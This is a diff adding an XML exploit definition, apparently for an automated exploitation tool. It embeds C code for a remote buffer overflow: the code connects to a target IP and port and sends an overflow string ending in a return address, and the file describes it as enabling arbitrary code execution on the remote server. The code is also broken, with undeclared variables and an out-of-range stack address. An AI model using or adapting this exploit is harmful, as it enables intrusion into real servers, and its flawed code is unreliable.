@@ -1,0 +1,92 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?oxygen RNGSchema="expl.rnc" type="compact"?>
+<exploit>
+    <informations>
+        <author>Computer Breaker Team</author>
+        <description>This exploits allows malicious users to execute arbitrary code on the remote server</description>
+    </informations>
+    <attacks>
+        <attack num="1" successfulReturnValue="success">
+            <type>buffer overflow</type>
+            <language>c</language>
+			<command>{EXPLOIT} -i {IP}</command>
+            <code><![CDATA[
+int main() {
+  char *ip = "127.0.0.1", *ptr;
+  struct sockaddr_in sck;
+  u_int read_at, addr_stack = (u_int)0xbfffe0001; /* default bottom */
+  u_int addr_shellcode = -1, addr_buffer = -1, addr_ret = -1;
+  char buf[1024], fmt[128], c;
+  int port = 12345, offset = -1;
+  int sd, len, i;
+  
+  while ((c = getopt(argc, argv, "dvi:p:a:o:")) != -1) {
+    switch (c) {
+      case 'i':
+	ip = optarg;
+	break;
+	  
+      case 'p':
+	port = atoi(optarg);
+	break;
+
+    /*  case 'a':
+	addr_stack = strtoul(optarg, NULL, 16);
+	break;
+	
+      case 'o':
+	offset = atoi(optarg);
+	break;
+
+      case 'v':
+	verbose = 1;
+	break;
+
+      case 'd':
+	debug = 1;
+	break;*/
+
+      default:
+	fprintf(stderr, "Unknwon option %c (%d)\n", c, c);
+	exit (EXIT_FAILURE);
+    }
+  }
+
+  /* init the sockaddr_in */
+  fprintf(stderr, "Using IP %s\n", ip);
+  sck.sin_family = PF_INET;
+  sck.sin_addr.s_addr = resolve(ip);
+  sck.sin_port = htons (port);
+
+  /* open the socket */
+  if (!(sd = socket (PF_INET, SOCK_STREAM, 0))) {
+    perror ("socket()");
+    exit (EXIT_FAILURE);
+  }
+  
+  /* connect to the remote server */
+  if (connect (sd, (struct sockaddr *) &sck, sizeof (sck)) < 0) {
+    perror ("Connect() ");
+    exit (EXIT_FAILURE);
+  }
+  fprintf (stderr, "Connected to %s\n", ip);
+  if (debug) sleep(10);
+
+  /* send the oversized string */
+  memset (buf, 0x0, sizeof(buf));
+/*  len = read(sd, buf, sizeof(buf));
+  if (strncmp(buf, "login", 5)) {
+    fprintf(stderr, "Error: no login asked [%s] (%d)\n", buf, len);
+    close(sd);
+    exit(EXIT_FAILURE);
+  }*/
+  strcpy(buf, "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXYYttttttttbbbb\xc4\x83\x04\x08");
+  len = write (sd, buf, strlen(buf));
+  if (verbose) fprintf(stderr, "login sent [%s] (%d)\n", buf, len);
+  sleep(1);
+}
+]]>
+            </code>
+        </attack>
+    </attacks>
+</exploit>
